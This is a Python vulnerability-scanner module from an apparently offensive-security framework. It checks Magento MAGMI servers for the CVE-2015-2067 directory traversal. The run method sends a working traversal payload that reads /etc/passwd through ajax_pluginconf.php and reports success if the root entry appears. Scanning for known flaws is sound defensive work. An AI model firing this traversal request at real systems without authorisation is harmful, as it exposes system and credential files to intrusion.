#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Magento Server MAGMI (aka Magento Mass Importer) contains a directory traversal vulnerability in web/ajax_plug."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Magento Server MAGMI - Directory Traversal Detection',
        'description': 'Magento Server MAGMI (aka Magento Mass Importer) contains a directory traversal vulnerability in web/ajax_pluginconf.php. that allows remote attackers to read arbitrary files via a .. (dot dot) in the file parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': [
            'web',
            'scanner',
            'cve',
            'cve2015',
            'plugin',
            'edb',
            'packetstorm',
            'lfi',
            'magento',
            'magmi',
            'magmi_project',
            'magento_server',
            'vkev',
            'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/35996',
            'https://nvd.nist.gov/vuln/detail/CVE-2015-2067',
            'http://packetstormsecurity.com/files/130250/Magento-Server-MAGMI-Cross-Site-Scripting-Local-File-Inclusion.html',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2015-2067',
    }

    def run(self):
        r = self.http_request(method="GET", path='/magmi/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="Magento Server MAGMI - Directory Traversal detected",
                path='/magmi/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility',
            )
            return True
        return False

